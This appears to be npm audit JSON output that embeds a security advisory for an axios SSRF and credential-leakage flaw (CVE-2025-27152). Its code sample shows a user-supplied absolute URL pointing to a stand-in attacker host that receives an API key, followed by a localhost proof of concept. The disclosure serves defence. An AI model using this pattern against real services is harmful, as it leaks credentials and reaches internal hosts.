Even if ⁠`baseURL` is set, axios sends the request to the specified absolute URL, potentially causing SSRF and credential leakage. This issue impacts both server-side and client-side usage of axios.\n\n### Details\n\nConsider the following code snippet:\n\n```js\nimport axios from \"axios\";\n\nconst internalAPIClient = axios.create({\n  baseURL: \"http://example.test/api/v1/users/\",\n  headers: {\n    \"X-API-KEY\": \"1234567890\",\n  },\n});\n\n// const userId = \"123\";\nconst userId = \"http://attacker.test/\";\n\nawait internalAPIClient.get(userId); // SSRF\n```\n\nIn this example, the request is sent to `http://attacker.test/` instead of the `baseURL`. As a result, the domain owner of `attacker.test` would receive the `X-API-KEY` included in the request headers.\n\nIt is recommended that:\n\n-\tWhen `baseURL` is set, passing an absolute URL such as `http://attacker.test/` to `get()` should not ignore `baseURL`.\n-\tBefore sending the HTTP request (after combining the `baseURL` with the user-provided parameter), axios should verify that the resulting URL still begins with the expected `baseURL`.\n\n### PoC\n\nFollow the steps below to reproduce the issue:\n\n1.\tSet up two simple HTTP servers:\n\n```\nmkdir /tmp/server1 /tmp/server2\necho \"this is server1\" > /tmp/server1/index.html \necho \"this is server2\" > /tmp/server2/index.html\npython -m http.server -d /tmp/server1 10001 &\npython -m http.server -d /tmp/server2 10002 &\n```\n\n\n2.\tCreate a script (e.g., main.js):\n\n```js\nimport axios from \"axios\";\nconst client = axios.create({ baseURL: \"http://localhost:10001/\" });\nconst response = await client.get(\"http://localhost:10002/\");\nconsole.log(response.data);\n```\n\n3.\tRun the script:\n\n```\n$ node main.js\nthis is server2\n```\n\nEven though `baseURL` is set to `http://localhost:10001/`, axios sends the request to `http://localhost:10002/`.\n\n### Impact\n\n-\tCredential Leakage: Sensitive API keys or credentials (configured in axios) may be exposed to unintended third-party hosts if an absolute URL is passed.\n-\tSSRF (Server-Side Request Forgery): Attackers can send requests to other internal hosts on the network where the axios program is running.\n-\tAffected Users: Software that uses `baseURL` and does not validate path parameters is affected by this issue.","reported_by":null,"title":"axios Requests Vulnerable To Possible SSRF and Credential Leakage via Absolute URL","metadata":null,"cves":["CVE-2025-27152"],"access":"public","severity":"high","module_name":"axios","vulnerable_versions":"<1.8.2","github_advisory_id":"GHSA-jr5f-v2jv-69x6","recommendation":"Upgrade to version 1.8.2 or later","patched_versions":">=1.8.2","updated":"2025-03-07T19:16:41.000Z","cvss":{"score":0,"vectorString":null},"cwe":["CWE-918"],"url":"https://github.com/advisories/GHSA-jr5f-v2jv-69x6"}},"muted":[],"metadata":{"vulnerabilities":{"info":0,"low":0,"moderate":1,"high":4,"critical":0},"dependencies":328,"devDependencies":0,"optionalDependencies":0,"totalDependencies":328}}
